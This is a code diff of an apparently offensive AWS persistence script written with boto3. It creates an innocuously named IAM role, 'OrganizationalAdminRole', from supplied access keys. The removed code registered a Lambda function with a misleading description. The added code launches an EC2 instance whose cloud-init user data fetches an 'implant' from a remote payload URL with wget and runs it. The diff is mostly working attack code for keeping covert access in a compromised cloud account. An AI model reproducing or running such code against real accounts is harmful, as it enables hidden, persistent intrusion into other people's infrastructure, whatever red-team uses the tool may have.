@@ -17,7 +17,7 @@ def listActions():
 def create_role(ak,sk):
     session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
     client = session.client('iam')
-    with open('modules/policies/trust-lambda.json') as json_file:
+    with open('modules/policies/trust.json') as json_file:
         trust_json = json.load(json_file)
     client.create_role(
         RoleName='OrganizationalAdminRole',
@@ -37,20 +37,27 @@ def create_role(ak,sk):
     )
     return True
 
-def lambda_persist(ak,sk):
+def ec2userdata_persist(ak,sk):
+    print('\nExecuting EC2 CreateInstance Persistence (UserData):')
     create_role(ak,sk)
     time.sleep(15)
+    # Use supplied iam keys
     session = boto3.session.Session(aws_access_key_id=ak, aws_secret_access_key=sk, region_name=region)
-    client = session.client('lambda')
-    response = client.create_function(
-        FunctionName='OrgUpdate',
-        Runtime='python3.7',
-        Role='arn:aws:iam::240213749104:role/OrganizationalAdminRole',
-        Handler='lambda_function.lambda_handler',
-        Code={
-            'ZipFile': open('modules/resources/lambda.zip', 'rb').read()
-        },
-        Description='Updates org permissions',
-        Publish=True
-    )
-    print(response)
+    ec2 = session.resource('ec2')
+    userdata = """#cloud-config
+            runcmd:
+            - mkdir /tmp/implant
+            - cd /tmp/implant
+            - wget -O implant %s
+            - ./implant
+        """ % payload_url
+    ec2.create_instances(
+        ImageId='ami-003634241a8fcdec0', 
+        MinCount=1, MaxCount=1, 
+        UserData=userdata, 
+        IamInstanceProfile={
+        'Name': 'OrganizationalAdminRole'
+        })
+    time.sleep(5)
+    listActions()
+    return True
